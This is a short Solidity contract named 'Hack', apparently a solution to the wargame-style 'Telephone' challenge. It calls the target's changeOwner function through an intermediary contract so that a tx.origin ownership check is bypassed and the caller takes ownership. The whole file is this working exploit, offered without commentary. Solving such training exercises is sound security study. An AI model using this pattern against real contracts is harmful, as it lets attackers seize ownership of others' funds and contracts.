// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner (address _owner)external;
}

contract Hack{
     Telephone tele;
    constructor(address addr)  {
       tele = Telephone(addr);
    }
    function hack() public {
    tele.changeOwner(msg.sender);
    }

}

